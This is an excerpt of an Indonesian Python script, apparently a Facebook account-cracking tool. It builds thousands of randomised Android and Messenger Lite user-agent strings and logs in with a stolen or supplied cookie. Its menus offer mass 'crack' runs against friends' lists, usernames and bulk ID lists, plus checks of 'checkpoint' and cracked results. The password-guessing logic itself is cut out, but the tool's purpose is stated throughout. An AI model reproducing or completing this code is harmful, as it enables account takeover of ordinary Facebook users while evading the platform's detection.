...
for xd in range(10000):
	...
	d='Redmi 8 Build/QKQ1.191014.001)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.57'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/410.0.0.17.85;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 11.0.1;'
...
for memekx in range(200):
	...
	build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016','TKQ1.220829.002','SKQ1.211006.001','RKQ1.211001.001','QKQ1.200830.002','LMY47I','OPM1.171019.011','MMB29M','QP1A.190711.020','TKQ1.220807.001']
	merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2','Xiaomi Mix Fold 2','Xiaomi Redmi K40 Pro','Xiaomi Redmi 10C','POCO M3','OPPO Neo 5','OPPO R11 Plus','Vivo Y55A','Realme Q2 Pro','Nokia G50','Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X6816D','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501']
	...
	ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1707 Build/LMY47I) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/3SinyalKuatHemat;FBMF/vivo;FBBD/vivo;FBDV/vivo 1707;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	...
	ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi Note 5 Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/XL Axiata;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 5;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua4 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; M2012K11AG Build/TKQ1.220829.002) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/3SinyalKuatHemat;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/M2012K11AG;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua5 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; RMX3708 Build/SKQ1.221119.001) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Realme;FBBD/Realme;FBDV/RMX3708;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	api = str(rc([ua1,ua2,ua3,ua4,ua5]))
	liu.append(api)
...
[bold green]                |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
             """,width=90,padding=(0,8),title=f"UA+",style=f"bold white"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
	cetak(panel(f"[[bold cyan]01[bold white]] Login Menggunakan Cookie              [[bold cyan]02[bold white]] Cek Hasil Crack ",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold yellow]Hans-Project",width=90,title=f"[bold green]Recode by",style=f"bold red"))
	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack From Friends     [bold white]                                         [[bold cyan]02[bold white]] Crack From Username[bold white]                                         [[bold cyan]03[bold white]] Get Headers      \n[bold white][[bold cyan]04[bold white]] Crack From Massal      [bold white]                                          [[bold cyan]05[bold white]] Check Opsi Checkpoint [bold white]                                        [[bold cyan]06[bold white]] [bold white]Check Result Crack [bold white]                                        [[bold cyan]07[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold white"))
	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____brayennn___xd____ in ['1','01']:
		brayen_dump()
	elif _____brayennn___xd____ in ['4','02']:
		dump_massal()
	elif _____brayennn___xd____ in ['2','06']:
		crack_nama()
	elif _____brayennn___xd____ in ['5','09']:
		file_cp()
	elif _____brayennn___xd____ in ['6']:
		result()
	elif _____brayennn___xd____ in ['3']:
		siu()
	elif _____brayennn___xd____ in ['7']:
...
def brayen_dump():
	try:
		...
		exit()
	cetak(panel('\t ce [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
